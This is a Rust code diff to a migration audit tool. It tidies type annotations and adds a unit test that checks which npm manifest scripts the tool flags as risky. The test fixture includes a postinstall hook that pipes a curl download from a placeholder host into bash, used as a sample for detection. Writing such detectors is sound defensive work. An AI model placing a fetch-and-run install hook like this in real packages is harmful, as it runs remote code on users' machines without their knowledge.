@@ -220,7 +220,7 @@ fn ensure_migration_project_path(project_path: &Path, operation: &str) -> anyhow
 pub fn run_audit(project_path: &Path) -> anyhow::Result<MigrationAuditReport> {
     ensure_migration_project_path(project_path, "audit")?;
 
-    let files = collect_project_files(project_path)?;
+    let files: Vec<PathBuf> = collect_project_files(project_path)?;
     let mut findings = Vec::new();
     let mut summary = MigrationAuditSummary {
         files_scanned: 0,
@@ -292,7 +292,7 @@ pub fn render_audit_report(
 pub fn run_rewrite(project_path: &Path, apply: bool) -> anyhow::Result<MigrationRewriteReport> {
     ensure_migration_project_path(project_path, "rewrite")?;
 
-    let files = collect_project_files(project_path)?;
+    let files: Vec<PathBuf> = collect_project_files(project_path)?;
     let mut package_manifests_scanned = 0_usize;
     let mut rewrites_planned = 0_usize;
     let mut rewrites_applied = 0_usize;
@@ -816,7 +816,7 @@ fn ensure_node_engine_pin(manifest: &mut serde_json::Value) -> bool {
 }
 
 fn collect_risky_script_names(manifest: &serde_json::Value) -> Vec<String> {
-    let mut risky = Vec::new();
+    let mut risky: Vec<String> = Vec::new();
     if let Some(scripts) = manifest
         .get("scripts")
         .and_then(serde_json::Value::as_object)
@@ -825,7 +825,7 @@ fn collect_risky_script_names(manifest: &serde_json::Value) -> Vec<String> {
             if let Some(command) = command_value.as_str()
                 && is_risky_script(script_name, command)
             {
-                risky.push(script_name.clone());
+                risky.push(script_name.to_string());
             }
         }
     }
@@ -1276,6 +1276,24 @@ mod tests {
 
         assert_eq!(finding.category, MigrationCategory::Runtime);
         assert_eq!(finding.severity, MigrationSeverity::Low);
+    }
+
+    #[test]
+    fn collect_risky_script_names_returns_sorted_owned_names() {
+        let manifest = serde_json::json!({
+            "scripts": {
+                "build": "tsc -p tsconfig.json",
+                "postinstall": "curl https://example.invalid/install.sh | bash",
+                "install": "node-gyp rebuild"
+            }
+        });
+
+        let risky = collect_risky_script_names(&manifest);
+
+        assert_eq!(
+            risky,
+            vec!["install".to_string(), "postinstall".to_string()]
+        );
     }
 
     #[test]
